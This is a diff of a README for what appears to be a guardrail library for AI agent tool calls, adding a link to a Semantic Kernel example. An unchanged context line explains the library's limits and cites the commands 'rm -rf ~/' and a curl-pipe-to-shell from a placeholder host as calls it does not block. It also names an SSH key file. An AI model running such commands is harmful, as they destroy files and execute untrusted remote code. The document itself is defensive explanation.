@@ -122,6 +122,8 @@ Arguments are checked before the function runs; with `on_block="raise"` a blocke
 
 `@guard`, `guarded_tool` and `check_tool_call` run the same text rules as `evaluate` on every string in the arguments: they block prompt-injection wording and secret-file names such as `~/.ssh/id_rsa`. They do not understand shell commands, so a call such as `rm -rf ~/` or `curl https://example.invalid/x.sh | sh` is allowed. Decide in your own code which tools may delete files or run commands.
 
+Runnable example with Microsoft Semantic Kernel: [examples/semantic-kernel-agent](https://github.com/usezn/zn/tree/main/examples/semantic-kernel-agent).
+
 ### LangChain / LangGraph
 
 The integration is tested against `langchain-core` 1.3.3 and the current 1.x release; 1.3.3 is the minimum supported version, because earlier releases have a known high severity advisory.
